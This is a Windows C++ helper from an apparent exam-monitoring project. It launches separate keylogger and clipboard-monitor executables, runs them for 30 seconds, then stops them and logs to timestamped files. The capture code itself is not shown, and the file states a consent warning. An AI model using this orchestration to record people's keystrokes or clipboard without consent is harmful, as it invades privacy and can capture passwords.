/**
 * @file helper.cpp
 * @brief Helper utility for managing keylogger and clipboard monitor processes.
 * 
 * This utility starts both the keylogger and clipboard monitor processes,
 * runs them for a specified duration, and then gracefully terminates them.
 * It's designed to be used as part of the SmartXm exam monitoring system.
 * 
 * The helper manages process lifecycle including:
 * - Starting keylogger and clipboard monitor executables
 * - Running them concurrently for monitoring duration
 * - Graceful shutdown via custom Windows messages
 * - Fallback to process termination if graceful shutdown fails
 * 
 * @author SmartXm Development Team
 * @date 2025
 * @version 1.0
 * 
 * @warning This helper should only be used for legitimate exam monitoring
 * purposes with proper user consent and in accordance with applicable laws.
 */

#include <windows.h>  // Windows API functions, structures, constants
#include <string>     // std::string
#include <iostream>   // For console output
#include <ctime>      // For timestamp generation

using namespace std;  // Use the standard namespace for convenience

/// @brief Custom Windows message to stop the keylogger and clipboard monitor
#define WM_STOP (WM_USER + 1)

// ============================================================================
// Configuration Constants
// ============================================================================

/// @brief Default monitoring duration in milliseconds (30 seconds)
const DWORD DEFAULT_MONITORING_DURATION_MS = 30000;

/// @brief Timeout for graceful process shutdown in milliseconds (5 seconds)
const DWORD PROCESS_SHUTDOWN_TIMEOUT_MS = 5000;

/// @brief Base directory for log files
const string LOG_DIRECTORY = "Logs/";

/// @brief Base directory for executable files
const string KEYLOGGER_EXECUTABLE = "Keylogger/keylogger.exe";
const string CLIPMON_EXECUTABLE = "ClipMon/clipmon.exe";

/// @brief Thread ID file paths for external process control
const string KEYLOGGER_THREAD_ID_FILE = "ThreadId/keyloggerThread.id";
const string CLIPMON_THREAD_ID_FILE = "ThreadId/clipMonThread.id";

// ============================================================================
// Process Management Structure
// ============================================================================

/**
 * @struct ProcessInfo
 * @brief Encapsulates process creation and management information.
 */
struct ProcessInfo {
    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;
    string executable;
    string logFileName;
    string displayName;
    
    /// @brief Constructor initializes structures
    ProcessInfo(const string& exec, const string& logFile, const string& name) 
        : executable(exec), logFileName(logFile), displayName(name) {
        ZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);
        ZeroMemory(&processInfo, sizeof(processInfo));
    }
};

// ============================================================================
// Utility Functions
// ============================================================================

/**
 * @brief Generates a timestamp-based log filename.
 * @param prefix The prefix for the log file (e.g., "keylogger", "clipboard")
 * @param extension The file extension (e.g., ".key", ".clip")
 * @return Formatted filename with timestamp
 */
string generateLogFileName(const string& prefix, const string& extension) {
    time_t now = time(0);
    struct tm* timeinfo = localtime(&now);
    
    char timestamp[32];
    strftime(timestamp, sizeof(timestamp), "%d-%m-%Y_%H-%M-%S", timeinfo);
    
    return LOG_DIRECTORY + timestamp + extension;
}

/**
 * @brief Creates a process with the specified parameters.
 * @param processInfo Reference to ProcessInfo structure containing process details
 * @return true if process creation succeeded, false otherwise
 */
bool createProcess(ProcessInfo& processInfo) {
    string commandLine = processInfo.executable + " " + processInfo.logFileName;
    
    bool success = CreateProcessA(
        NULL,                                    // Application name
        (LPSTR)commandLine.c_str(),             // Command line
        NULL,                                   // Process security attributes
        NULL,                                   // Thread security attributes
        FALSE,                                  // Inherit handles
        0,                                      // Creation flags
        NULL,                                   // Environment block
        NULL,                                   // Current directory
        &processInfo.startupInfo,               // Startup info
        &processInfo.processInfo                // Process info
    );
    
    if (!success) {
        string errorMsg = "Failed to start " + processInfo.displayName + 
                         ". Error: " + to_string(GetLastError());
        MessageBoxA(NULL, errorMsg.c_str(), 
                   (processInfo.displayName + " Failed").c_str(), 
                   MB_ICONERROR | MB_OK);
    }
    
    return success;
}

/**
 * @brief Attempts graceful shutdown of a process using WM_STOP message.
 * @param processInfo Reference to ProcessInfo structure
 * @return true if graceful shutdown succeeded, false if forced termination was needed
 */
bool shutdownProcessGracefully(ProcessInfo& processInfo) {
    // Attempt graceful shutdown via WM_STOP message
    if (PostThreadMessage(processInfo.processInfo.dwThreadId, WM_STOP, 0, 0)) {
        // Wait for graceful shutdown with timeout
        DWORD waitResult = WaitForSingleObject(processInfo.processInfo.hProcess, 
                                             PROCESS_SHUTDOWN_TIMEOUT_MS);
        
        if (waitResult == WAIT_OBJECT_0) {
            return true; // Graceful shutdown successful
        }
    }
    
    TerminateProcess(processInfo.processInfo.hProcess, 0);
    return false; // Forced termination
}

/**
 * @brief Waits for process termination and cleans up handles.
 * @param processInfo Reference to ProcessInfo structure
 */
void cleanupProcess(ProcessInfo& processInfo) {
    // Wait for process to completely terminate
    WaitForSingleObject(processInfo.processInfo.hProcess, INFINITE);
    
    // Clean up handles to prevent resource leaks
    CloseHandle(processInfo.processInfo.hProcess);
    CloseHandle(processInfo.processInfo.hThread);
}

// ============================================================================
// Main Function
// ============================================================================

/**
 * @brief Entry point of the helper utility for exam monitoring.
 * @return Exit status code (0 for success, 1 for failure)
 * 
 * This function orchestrates the exam monitoring process by:
 * 1. Generating timestamped log filenames for both processes
 * 2. Creating ProcessInfo structures for keylogger and clipboard monitor
 * 3. Starting both processes using the createProcess function
 * 4. Running them concurrently for the specified monitoring duration
 * 5. Gracefully shutting down both processes using shutdownProcessGracefully
 * 6. Cleaning up process handles and resources
 * 
 * The monitoring duration is configurable via DEFAULT_MONITORING_DURATION_MS.
 * Both processes log their output to timestamped files in the Logs directory.
 * 
 * @note Uses extracted functions for better maintainability and error handling
 * @note Process communication uses Windows PostThreadMessage() for graceful shutdown
 * @warning Requires appropriate Windows permissions to create and manage processes
 * 
 * @see createProcess(), shutdownProcessGracefully(), cleanupProcess()
 */
int main() {
    // Generate timestamped log filenames
    string keyloggerLogFile = generateLogFileName("", ".key");
    string clipmonLogFile = generateLogFileName("", ".clip");
    
    // Create process information structures
    ProcessInfo keyloggerProcess(KEYLOGGER_EXECUTABLE, keyloggerLogFile, "Keylogger");
    ProcessInfo clipmonProcess(CLIPMON_EXECUTABLE, clipmonLogFile, "ClipMon");
    
    // Track which processes were successfully started for proper cleanup
    bool keyloggerStarted = false;
    bool clipmonStarted = false;
    
    // Start keylogger process
    if (!createProcess(keyloggerProcess)) {
        return 1; // Exit if keylogger fails to start
    }
    keyloggerStarted = true;
    
    // Start clipboard monitor process
    if (!createProcess(clipmonProcess)) {
        // If clipboard monitor fails, clean up keylogger and exit
        shutdownProcessGracefully(keyloggerProcess);
        cleanupProcess(keyloggerProcess);
        return 1;
    }
    clipmonStarted = true;
    
    // Both processes started successfully - run monitoring for specified duration
    Sleep(DEFAULT_MONITORING_DURATION_MS);
    
    // Gracefully shutdown both processes
    bool keyloggerGraceful = shutdownProcessGracefully(keyloggerProcess);
    bool clipmonGraceful = shutdownProcessGracefully(clipmonProcess);
    
    // Clean up process handles
    cleanupProcess(keyloggerProcess);
    cleanupProcess(clipmonProcess);
    
    return 0; // Exit successfully
}
